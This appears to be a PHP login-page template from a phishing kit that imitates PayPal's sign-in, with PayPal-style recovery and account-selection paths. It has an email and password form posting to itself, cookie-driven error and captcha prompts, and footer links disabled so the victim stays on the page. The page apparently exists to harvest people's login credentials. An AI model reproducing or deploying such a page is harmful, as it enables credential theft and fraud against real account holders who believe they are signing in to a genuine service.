<?  
session_start();
error_reporting(0);
include("../lang/language.php");
?>  
<body>
<div class="content"><div class="principale"> 
<div class="logo-header-svg" style="margin-bottom: 16px;"></div><div class=" "></div>

<form method="POST" action="" name="login" id="login">

<?

if ($_COOKIE['error'] == 'true') {
 echo('<div id="err">
<div class="ereur">
    <div class="icon-alert"></div>
    <div style="margin-left: 26px;padding: 6px;">'.$language['login'][2].'</div>
</div> 
</div>');
setcookie("error", "", time() - 3600);
}
?>
 


    <div class="maildivv" >
        <div class="maildivv" style="z-index: 100;" >
<div class="em new-input ok" >
    <input class="controlar-formu" name="email" required="" autocomplete="off" type="text" placeholder="<? echo($language['login'][7]) ?>" id="emay-add" value="<? echo $_COOKIE['email']; ?>">
</div>
<div class="errror">
    <p style="padding-top: 5px"><? echo($language['login'][3]) ?></p>
</div><div class=" "></div>
        </div><div class=" "></div>
        <div class="maildivv">
<div class="new-input ok" >
    <input class="controlar-formu password" name="pass" required="" type="text" placeholder="<? echo($language['login'][8]) ?>" id="password" > 
 

<a id="show" class="hide"><? echo($language['login'][10]) ?></a>


</div>
<div class="errror pass"> 
    <p style="padding-top: 5px"><? echo($language['login'][13]) ?></p>
</div><div class=" "></div></div><div class=" "></div></div><div class=" "></div>

<?    

if ($_COOKIE['captcha'] == 'true') {
  echo('<div class="captcha">
<div id="img" style="border-radius: 5px;overflow: hidden;border: 1px solid #e0e0e0;"></div><br>
<table class="captcha">
    <tr>
        <td><input type="text" required="" autocomplete="off" placeholder="Enter the code" class="controlar-formu" style="height: 36px;" name="captcha"></td>
        <td><button type="button" class="reCaptcha buttonCaptcha"><div class="repeatCaptcha"></div></button></td>
        <td><button type="button" class="buttonCaptcha"><div class="soundCaptcha"></div></button></td>
    </tr>
</table>
</div>');
}
?>




<div style="margin-top:30px" >
<style type="text/css">
</style>
        <button style="border-radius: 5px;" class="button" id="login" type="submit" name="btnlg" value="Login"><? echo($language['login'][4]) ?></button>
     </div><div class=" "></div>
<div class="lineab"> 
<a href="<? echo "$url"; ?>/authflow/password-recovery/?<? echo $_COOKIE['code_cn']; ?>" onclick="window.location.href = '#';return false"><big style="font-size: 14.5;"><? echo($language['login'][9]) ?></big></a><div class=" "></div>


<table class="or"><tr>
    <td><hr></td>
    <td><? echo($language['login'][12]) ?></td>
    <td><hr></td>
</tr></table>


<a href="<? echo "$url"; ?>/webapps/mpp/account-selection" onclick="window.location.href='#';return false" class="button btttn"><? echo($language['login'][5]) ?></a><div class=" "></div></div><div class=" "></div>

        </form>
    </section> 
    <br> 
</div><div class=" "></div>
        </div><div class=" "></div>
        <div id="load" class="rotation loading hide">
<!-- <p>Checking your information...</p> -->
        </div><div class=" "></div>
    </div><div class=" "></div>
    <footer class="footer footer-sec">
        <br>

<div class="extendedContent" ><ul class="footerGroup footerGroupWithSiblings" ><li><a href="#" ><? echo($language['copyright'][1]) ?></a><div class=" "></div></li><li><a href="#" ><? echo($language['copyright'][2]) ?></a><div class=" "></div></li></ul><p class="footerCopyright" ><? echo($language['copyright'][3]) ?></p><p class="footerDisclaimer" ><? echo($language['copyright'][4]) ?></p></div><div class=" "></div>

    </footer>

</body>
<script type="text/javascript">
      $("#show").click(function () {
    if ($("#password").attr("type") == "hidden") {
        $("#password").attr("type", "text");
        $("#show").text("<? echo($language['login'][10]) ?>");
        $(".pass").attr("type", "hidden");
        

    } else {
        $("#password").attr("type", "hidden");
        $(".pass").attr("type", "text");
        $("#show").text("<? echo($language['login'][11]) ?>");
    }
});
      $('.reCaptcha').click(function(){
    captcha();
});
</script>
<script type="text/javascript" src="../files/js/password.js"></script>